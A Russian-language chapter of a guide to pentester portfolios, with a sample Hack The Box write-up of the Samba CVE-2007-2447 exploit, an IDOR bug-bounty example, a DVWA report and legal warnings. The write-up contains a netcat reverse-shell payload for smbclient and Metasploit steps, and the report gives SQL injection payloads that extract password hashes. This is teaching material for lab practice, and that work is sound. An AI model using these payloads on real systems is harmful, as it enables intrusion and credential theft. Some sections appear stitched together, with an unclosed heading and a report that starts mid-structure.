## 16.2.1 Портфолио пентестера vs SOC-аналитика

Если SOC-аналитик демонстрирует навыки расследования и реакции на инциденты, то пентестер должен показать атакующие навыки. Это принципиально разные подходы.

```
СРАВНЕНИЕ ПОРТФОЛИО:
====================

SOC-аналитик                    │  Пентестер
────────────────────────────────┼──────────────────────────────
SIEM dashboards и правила       │  Эксплойты и PoC коды
Playbooks расследований         │  Write-ups взломанных машин
IOC коллекции                   │  Bug bounty репорты
YARA/Sigma правила              │  Инструменты для пентеста
Малварь-анализы                 │  Методологии атак
Метрики SOC                     │  Пентест-отчёты
Threat intelligence отчёты      │  Собственные CVE (мечта)
────────────────────────────────┼──────────────────────────────
Формат: аналитические документы │  Формат: технические репорты
Tone: defensive, проактивный    │  Tone: атакующий, конструктивный
```

### Что работодатель смотрит в портфолио пентестера

```
Рекрутер/HR (5-10 минут):
├── GitHub профиль существует? ✓/✗
├── README профессиональный? ✓/✗
├── Есть репозитории с инструментами? ✓/✗
└── Есть write-ups / блог? ✓/✗

Технический интервьюер (30-60 минут):
├── Читает write-up по HTB машине
├── Смотрит код инструментов
├── Оценивает понимание уязвимостей
├── Проверяет умение писать отчёты
└── Ищет нестандартное мышление

Что ищут оба:
┌────────────────────────────────────────────────┐
│  1. Доказательства что вы РЕАЛЬНО это делали   │
│  2. Понимание ПОЧЕМУ работает атака            │
│  3. Умение объяснить находку понятно           │
│  4. Аккуратность и системность                 │
│  5. Постоянное развитие (регулярные коммиты)   │
└────────────────────────────────────────────────┘
```

## 16.2.3 Write-ups: как писать профессионально

Write-up (разбор машины) — основа портфолио пентестера. Работодатели буквально читают их как код разработчика.

### Структура идеального write-up

```markdown
# HTB: Машина [Имя] — [Сложность] — [ОС]

## Краткая сводка

**Сложность:** Easy | **ОС:** Linux | **Дата:** 2024-01-15

Машина [имя] — Linux-сервер с устаревшей версией Samba (3.0.20),
уязвимой к CVE-2007-2447 (username map script). Foothold получен 
через Metasploit модуль exploit/multi/samba/usermap_script.
Root доступ был получен немедленно так как Samba запущена от root.

**Техники:** Samba RCE, CVE-2007-2447
**Инструменты:** nmap, metasploit, smbclient

---

## Разведка (Reconnaissance)

### Nmap сканирование

```bash
nmap -sC -sV -oA lame 10.10.10.3
```

**Результат:**
```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.0.20
```

**Ключевые наблюдения:**
- Samba 3.0.20 — очень старая версия, потенциально уязвима
- vsftpd 2.3.4 — известна бэкдором (CVE-2011-2523), проверим

### FTP Enumeration

```bash
ftp 10.10.10.3
# Anonymous login attempt
```

Anonymous вход запрещён. Проверяем vsftpd backdoor:
```bash
searchsploit vsftpd 2.3.4
# Exploit/unix/ftp/vsftpd_234_backdoor
```

Проверка показала что бэкдор не активирован на этой машине.

### SMB Enumeration

```bash
smbclient -L //10.10.10.3 -N
smbmap -H 10.10.10.3
```

```
[+] Finding open SMB ports...
[+] Guest SMB session established on 10.10.10.3...
[!] Error: Server doesn't allow session setup at user level
```

---

## Поиск уязвимостей (Vulnerability Analysis)

Samba 3.0.20 уязвима к CVE-2007-2447. Эта уязвимость позволяет
выполнять произвольные команды через поле username при включённом
параметре `username map script`.

**Механизм уязвимости:**
```
Samba 3.0.0 - 3.0.25rc3:
Если в smb.conf есть параметр "username map script",
то Samba передаёт username в shell без санитизации.

Атака: в поле username вставляем shell команду:
"/=`nohup nc -e /bin/sh 10.10.14.X 4444`"
```

---

## Эксплуатация (Exploitation)

### Через Metasploit

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST 10.10.14.X
run
```

```
[*] Started reverse TCP handler on 10.10.14.X:4444
[*] Command shell session 1 opened
```

### Ручная эксплуатация (без Metasploit)

```bash
# Listener
nc -lvnp 4444

# Атака через smbclient
smbclient //10.10.10.3/tmp -N
smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.X 4444`"
```

## Повышение привилегий (Privilege Escalation)

```bash
whoami
# root
```

Samba запущена от root — дополнительного privesc не требуется.

## Выводы и уроки

1. **Устаревший ПО = уязвимости.** Samba 3.0.20 2007 года —
   критически устаревшая версия с публичными эксплойтами.

2. **Принцип минимальных привилегий нарушен.** Samba не должна
   работать от root. Достаточно выделенного пользователя samba.

3. **Рекомендации по устранению:**
   - Обновить Samba до актуальной версии
   - Запускать Samba от непривилегированного пользователя
   - Настроить firewall — закрыть 445 порт от внешних сетей

---

## Инструменты

| Инструмент | Назначение | Команда |
|-----------|-----------|---------|
| nmap | Сканирование портов | `nmap -sC -sV` |
| smbclient | SMB клиент | `smbclient -L //IP -N` |
| metasploit | Фреймворк эксплойтов | `msfconsole` |
| searchsploit | Поиск эксплойтов | `searchsploit samba 3.0` |
```

### Ключевые принципы хорошего write-up

```
ЧТО ДЕЛАЕТ WRITE-UP ЦЕННЫМ:
============================

1. ОБЪЯСНЕНИЕ ПОЧЕМУ, не только КАК
   Плохо: "Я запустил linpeas и нашёл SUID"
   Хорошо: "SUID на /usr/bin/find позволяет выполнять
            команды с привилегиями root, потому что..."

2. РУЧНОЙ СПОСОБ + АВТОМАТИЧЕСКИЙ
   - Сначала покажи через Metasploit (быстро)
   - Потом покажи вручную (понимание)
   - Работодатель ценит оба подхода

3. ОШИБКИ И МЁРТВЫЕ КОНЦЫ
   "Сначала я пробовал vsftpd backdoor, но он не
   сработал потому что... Тогда я переключился на..."
   
   Это показывает реальный мыслительный процесс!

4. РЕКОМЕНДАЦИИ ПО ЗАЩИТЕ
   Каждый write-up должен заканчиваться
   рекомендациями как исправить уязвимость.
   Это разница между скриптокиддером и пентестером.

5. ЧИСТЫЙ ФОРМАТИРОВАННЫЙ КОД
   Все команды в блоках ```bash
   Все выводы в блоках ```
   Скриншоты (опционально, но плюс)
```

```
ПЛАТФОРМЫ ДЛЯ ПУБЛИКАЦИИ:

### Пример оформления Bug Bounty находки в портфолио

```markdown
# Bug Bounty: IDOR в API пользователей

**Программа:** [Название] Bug Bounty (имя скрыто по NDA)
**Тип:** IDOR (Insecure Direct Object Reference)
**Критичность:** Medium (CVSS 6.5)
**Статус:** Исправлено ✓ | Награда: получена
**Hall of Fame:** [ссылка если есть]

## Описание уязвимости

API эндпоинт `/api/v1/users/{id}/profile` возвращал
полные данные любого пользователя без проверки
авторизации, что позволяло получить:
- Имя и фамилию
- Email адрес
- Номер телефона (частично замаскированный)
- Историю заказов

## Техническое описание

Уязвимость класса IDOR возникла из-за отсутствия
проверки: "является ли запрашивающий пользователь
владельцем ресурса {id}".

## Вектор атаки

1. Авторизоваться как легитимный пользователь
2. Перехватить запрос к `/api/v1/users/12345/profile`
3. Изменить `12345` на любой другой ID
4. Получить данные чужого аккаунта

## Рекомендации

Добавить проверку авторизации:
- Убедиться что `request.user.id == profile.user_id`
- Или использовать токен-based доступ без числовых ID

## Временная шкала

- Найдено: 2024-01-10
- Отправлен репорт: 2024-01-11
- Подтверждено: 2024-01-15
- Исправлено: 2024-01-28
- Раскрытие: 2024-02-15
```

## 1. Executive Summary

В ходе тестирования приложения DVWA было выявлено **8 уязвимостей**,

## 3. Находки

### 3.1 УЯЗВ-001: SQL Injection (КРИТИЧЕСКАЯ)

**CVSS Score:** 9.8 (Critical)  
**Тип:** CWE-89 (Improper Neutralization of SQL Commands)  
**Параметр:** `id` в `/vulnerabilities/sqli/`

#### Описание

Параметр `id` не санитизируется перед подстановкой в SQL-запрос,
что позволяет изменять логику запроса к базе данных.

#### Доказательство эксплуатации

**Шаг 1.** Определение количества столбцов:
```
Input: 1' ORDER BY 1-- -
Input: 1' ORDER BY 2-- -  
Input: 1' ORDER BY 3-- -  ← ошибка, значит 2 столбца
```

**Шаг 2.** Извлечение версии базы данных:
```
Input: 1' UNION SELECT @@version,NULL-- -
Output: 5.7.41-0ubuntu0.18.04.1
```

**Шаг 3.** Извлечение учётных данных:
```
Input: 1' UNION SELECT user,password FROM users-- -
Output:
admin | 5f4dcc3b5aa765d61d8327deb882cf99 (MD5: "password")
gordonb | e99a18c428cb38d5f260853678922e03
...
```

[Скриншот: screenshots/01-sqli-credentials.png]

#### Рекомендации

1. Использовать Prepared Statements (параметризованные запросы):
```php
// УЯЗВИМО:
$query = "SELECT * FROM users WHERE id = '$id'";

// БЕЗОПАСНО:
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

2. Применить Input Validation (whitelist для числовых ID)
3. Настроить WAF для обнаружения SQL-инъекций

## 16.2.8 Что НЕ публиковать (легальные риски)

Это критически важный раздел. Ошибки здесь могут привести к уголовному преследованию.

```
КАТЕГОРИЧЕСКИ ЗАПРЕЩЕНО:
=========================

1. РЕАЛЬНЫЕ УЯЗВИМОСТИ В ЖИВЫХ СИСТЕМАХ
   ✗ "Нашёл SQL injection на сайте X, вот PoC"
   ✗ Скриншоты реальных систем без разрешения
   ✗ Данные реальных пользователей

   Правовая основа: УК РФ ст. 272 (НСД к КИ),
   ст. 273 (создание вредоносных программ)
   Риск: 2-7 лет лишения свободы

2. ИНСТРУМЕНТЫ С ЯВНО ВРЕДОНОСНЫМ НАЗНАЧЕНИЕМ
   ✗ Готовые эксплойты против конкретных систем
   ✗ Кейлоггеры, трояны, ransomware (даже "учебные")
   ✗ Инструменты для автоматизации атак без disclaimer

3. BUG BOUNTY ДО ИСПРАВЛЕНИЯ
   ✗ Публикация до фикса = нарушение условий программы
   ✗ Дисквалификация + возможный иск
   ✗ Бан с платформы (HackerOne, Bugcrowd)

4. ДАННЫЕ КЛИЕНТОВ РАБОТОДАТЕЛЯ
   ✗ Детали коммерческих пентестов без разрешения
   ✗ Названия клиентов, IP, уязвимости из работы
   ✗ Нарушение NDA = иск + увольнение

5. ПЕРСОНАЛЬНЫЕ ДАННЫЕ
   ✗ Скриншоты с реальными email, паролями, именами
   ✗ PCAP файлы с реальным трафиком
   ✗ Любые данные из "случайно" скачанных БД
```

```
СЕРАЯ ЗОНА — КОНСУЛЬТИРУЙТЕСЬ С ЮРИСТОМ:
==========================================

Может быть проблемой:
? Публикация эксплойта к уязвимости через год после патча
? Write-up о реальной атаке даже с обезличиванием
? Инструменты которые "могут" использоваться во вред
? Демонстрация техник bypassa конкретных продуктов

Как защититься:
✓ Всегда добавляйте disclaimer: "Только для образовательных
  целей. Тестировалось только в лабораторных условиях."
✓ Используйте только легальные платформы (HTB, THM, DVWA)
✓ Получайте письменное разрешение перед публикацией
✓ При сомнениях — не публикуйте
```
